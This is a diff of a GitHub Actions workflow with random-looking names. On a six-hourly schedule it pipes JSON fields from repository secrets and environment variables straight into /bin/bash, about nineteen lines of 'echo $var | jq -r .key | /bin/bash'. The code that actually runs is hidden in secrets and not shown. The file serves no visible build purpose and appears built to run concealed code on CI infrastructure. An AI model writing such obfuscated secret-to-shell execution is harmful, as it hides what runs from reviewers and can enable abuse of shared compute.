@@ -1,9 +1,8 @@
 name: hongyanshui3109
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 1/6 * * *'
+    - cron: '44 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +11,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: hongyanshui3109
         env:
-          z3364: ${{ secrets.z3364 }}
+          nkprd803: ${{ secrets.nkprd803 }}
         run: |
-          echo $z3364 | jq -r .rsdy71404 | /bin/bash
-          echo $xq1 | jq -r .lxd75107 | /bin/bash
-          echo $xklln82 | jq -r .ron24 | /bin/bash
-          echo $d1 | jq -r .xx05652 | /bin/bash
-          echo $vpi86 | jq -r .supr0 | /bin/bash
-          echo $zrfj929 | jq -r .z9 | /bin/bash
-          echo $py17883 | jq -r .hswqz04496 | /bin/bash
-          echo $jc70213 | jq -r .kidfc113 | /bin/bash
-          echo $yl2 | jq -r .jbiyy1 | /bin/bash
-          echo $ln1013 | jq -r .x4 | /bin/bash
-          echo $vvgcs11377 | jq -r .pnq3105 | /bin/bash
-          echo $ovaq56079 | jq -r .bktab26972 | /bin/bash
-          echo $lzk40 | jq -r .n40369 | /bin/bash
+          echo $nkprd803 | jq -r .hroda52 | /bin/bash
+          echo $dj7345 | jq -r .va10228 | /bin/bash
+          echo $vigv244 | jq -r .tgxz4862 | /bin/bash
+          echo $tjtra04 | jq -r .qqecj59 | /bin/bash
+          echo $luu29 | jq -r .miiey3 | /bin/bash
+          echo $ls189 | jq -r .onax889 | /bin/bash
+          echo $ap4690 | jq -r .ei11516 | /bin/bash
+          echo $rylmb445 | jq -r .izvz6370 | /bin/bash
+          echo $hkn3511 | jq -r .rgl87 | /bin/bash
+          echo $dq971 | jq -r .wimc24522 | /bin/bash
+          echo $rxz071 | jq -r .z91 | /bin/bash
+          echo $lxcxl30234 | jq -r .fyty900 | /bin/bash
+          echo $dsd14163 | jq -r .bvm70 | /bin/bash
+          echo $jcr0574 | jq -r .m199 | /bin/bash
+          echo $bwksa6 | jq -r .yciix42 | /bin/bash
+          echo $z75158 | jq -r .iy972 | /bin/bash
+          echo $z1381 | jq -r .l0 | /bin/bash
+          echo $oaes04538 | jq -r .hclam957 | /bin/bash
+          echo $qvnx35 | jq -r .b070 | /bin/bash
 
